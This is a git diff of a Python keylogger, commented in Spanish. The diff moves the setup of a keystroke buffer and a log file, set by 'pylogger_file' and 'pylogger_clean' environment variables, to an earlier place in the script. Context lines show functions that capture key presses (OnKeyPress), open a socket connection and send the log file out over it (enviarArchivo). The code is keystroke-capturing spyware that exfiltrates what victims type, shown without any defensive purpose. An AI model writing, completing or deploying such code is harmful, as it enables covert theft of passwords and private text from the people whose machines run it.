@@ -6,6 +6,23 @@ from threading import Timer
 import time
 import subprocess
 
+
+# Guardamos lo que se va escribiendo antes de presionar espacio o enter
+listaCadena =  []
+
+# Obtenemos el archivo
+archivo = os.environ.get(
+    'pylogger_file',
+    os.path.expanduser('file.log')
+)
+ 
+# Validamos si existe el archivo
+if os.environ.get('pylogger_clean', None) is not None:
+    try:
+        os.remove(archivo)
+    except EnvironmentError:
+        pass
+
 def enviarArchivo(sck: socket.socket, archivo):
     # Obtener el tamaño del archivo a enviar.
     tamArchivo = os.path.getsize(archivo)
@@ -28,24 +45,6 @@ def crearConexion():
         with open(archivo, 'a') as f:
             f.write('**** El socket no se puede conectar ****')
             f.write('\n')
-
-
-# Guardamos lo que se va escribiendo antes de presionar espacio o enter
-listaCadena =  []
-
-# Obtenemos el archivo
-archivo = os.environ.get(
-    'pylogger_file',
-    os.path.expanduser('file.log')
-)
- 
-# Validamos si existe el archivo
-if os.environ.get('pylogger_clean', None) is not None:
-    try:
-        os.remove(archivo)
-    except EnvironmentError:
-        pass
-
 # Comienza a obtener las teclas
 def OnKeyPress(event):
     # Validamos que solo se guarden las cadenas cuando se presiona espacio o enter.
